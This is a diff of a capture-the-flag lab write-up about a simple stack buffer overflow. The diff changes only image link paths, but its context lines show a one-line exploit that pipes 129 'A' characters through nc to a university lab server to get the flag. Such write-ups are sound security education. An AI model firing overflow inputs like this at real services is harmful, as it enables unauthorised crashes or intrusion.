@@ -16,9 +16,9 @@ I received two files:
 - An ELF 32-bit LSB executable.
 - The C source code of the executable.
 
-![[IST/SSoF/CTF's/ist1117363/Lab5/Simple Overflow/Images/Files.png]]
+![[Files.png]]
 
-![[IST/SSoF/CTF's/ist1117363/Lab5/Simple Overflow/Images/Source code.png]]
+![[Source code.png]]
 
 The source code has a classic stack buffer overflow vulnerability. The critical section of the code is here:
 
@@ -52,7 +52,7 @@ I used this command to get the flag:
 python3 -c "print('A'*129)" | nc mustard.stt.rnl.tecnico.ulisboa.pt 25151
 ```
 
-![[IST/SSoF/CTF's/ist1117363/Lab5/Simple Overflow/Images/Flag.png]]
+![[Flag.png]]
 
 ## FLAG
 ```flag
